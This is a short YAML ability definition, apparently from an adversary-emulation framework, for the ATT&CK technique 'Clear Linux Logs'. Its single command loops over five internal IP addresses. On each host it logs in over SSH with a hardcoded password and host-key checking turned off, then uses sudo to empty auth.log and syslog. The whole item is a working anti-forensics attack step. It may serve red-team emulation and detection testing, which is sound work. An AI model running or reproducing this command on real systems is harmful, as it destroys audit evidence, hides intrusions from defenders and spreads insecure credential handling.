- id: de01-clear-logs
  name: Clear Auth and System Logs
  description: Clear /var/log/auth.log and /var/log/syslog on all servers
  tactic: defense-evasion
  technique:
    attack_id: T1070.002
    name: Indicator Removal - Clear Linux Logs
  platforms:
    linux:
      sh:
        command: |
          for h in 10.0.20.10 10.0.20.21 10.0.20.30 10.0.20.40 10.0.20.200; do sshpass -p 'toor' ssh -o StrictHostKeyChecking=no labuser@$h "sudo sh -c 'echo > /var/log/auth.log; echo '' > /var/log/syslog; echo '[+] Logs cleared on $(hostname)'" 2>/dev/null & done; wait

  singleton: false
  repeatable: false
